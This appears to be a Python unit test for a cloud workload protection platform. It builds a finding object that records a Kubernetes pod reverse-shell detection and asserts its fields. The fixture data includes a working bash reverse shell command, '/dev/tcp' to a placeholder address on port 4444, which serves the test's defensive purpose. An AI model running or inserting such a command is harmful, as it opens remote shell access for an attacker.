"""
tests/unit/test_phase27_cwpp.py
===============================
Phase 27 Cloud Workload Protection Platform (CWPP) Unit Tests.
"""

import pytest
from backend.app.models.cloud_security import CloudWorkloadFinding


class TestCWPPThreatDetection:
    """Unit tests for CWPP runtime threat detections and containment."""

    def test_cwpp_model_instantiation(self):
        """CloudWorkloadFinding model must initialize with valid fields."""
        finding = CloudWorkloadFinding(
            tenant_id="tenant-123",
            workload_type="K8S_POD",
            workload_id="k8s://cluster/default/pod-01",
            workload_name="pod-01",
            host_ip="10.0.0.5",
            threat_type="REVERSE_SHELL",
            severity="CRITICAL",
            process_name="bash",
            command_line="bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            mitre_attack_technique="T1059.004",
            containment_status="DETECTED",
            is_contained=False
        )
        assert finding.workload_type == "K8S_POD"
        assert finding.threat_type == "REVERSE_SHELL"
        assert finding.severity == "CRITICAL"
        assert finding.is_contained is False
